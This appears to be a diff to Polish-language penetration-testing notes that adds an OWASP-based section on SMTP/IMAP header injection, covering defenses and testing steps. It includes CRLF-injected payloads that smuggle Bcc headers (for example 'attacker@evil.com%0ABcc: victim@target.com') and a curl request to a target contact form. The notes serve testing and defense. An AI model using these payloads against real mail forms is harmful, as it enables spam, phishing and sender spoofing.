@@ -59,12 +59,40 @@ curl -X POST "https://TARGET/contact" -d "from=attacker%0ATo:victim@target.com&m
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
-> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md
+> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md
 
-- Waliduj i sanityzuj naglowki email — odrzuc input z CRLF (\r\n)
-- Uzywaj bibliotek z wbudowana ochrona przed header injection
-- Nie pozwalaj uzytkownikowi na kontrolowanie naglowkow From, To, CC, BCC
-- Ogranicz dozwolone znaki w polach email do [a-zA-Z0-9@._-]
+### SMTP Header Injection
+
+- Atakujacy wstrzykuje naglowki SMTP przez CRLF (`%0D%0A`, `\r\n`)
+- Payload: `attacker@evil.com%0ABcc: victim@target.com` — dodaje Bcc z adresem ofiary
+- Skutki: mass mailing (spam), phishing z adresu zaufanego, wyciek informacji
+
+### IMAP/SMTP Injection
+
+- Jesli aplikacja laczy sie z serwerem poczty — atakujacy moze wstrzyknac komendy IMAP/SMTP
+- IMAP: odczyt/usuniecie emaili innych uzytkownikow
+- SMTP: wysylanie emaili jako dowolny nadawca (spoofing)
+
+### Obrona
+
+- **Odrzucaj CRLF** (`\r`, `\n`, `%0A`, `%0D`) w WSZYSTKICH polach email — header injection
+- **Uzywaj bibliotek z wbudowana ochrona**: PHPMailer (>= 5.2.27), JavaMail, Python smtplib
+- **NIE pozwalaj uzytkownikowi kontrolowac**: From, To, Cc, Bcc, Subject (chyba ze walidowane)
+- **Allowlist znakow** w polach email: `[a-zA-Z0-9@._+-]`
+- **Waliduj format email**: regex lub dedykowana biblioteka (np. email-validator)
+- **Rate limiting** na wysylanie emaili — zapobiegaj mass mailing
+
+### Email Body Injection (XSS via Email)
+
+- Jesli email jest renderowany jako HTML — mozliwy XSS
+- Sanityzuj HTML w body emaila — uzywaj text/plain lub DOMPurify na HTML
+- Nie renderuj user-supplied content w HTML emailach bez sanityzacji
+
+### Testowanie
+
+- Wstrzyknij `%0ABcc:attacker@evil.com` w pola: nazwa, email, subject, message
+- Sprawdz czy serwer wysyla email z dodanym Bcc
+- Testuj rozne encodowania CRLF: `%0A`, `%0D%0A`, `\r\n`, `\n`
 
 ## ROZSZERZENIA BURP SUITE
 
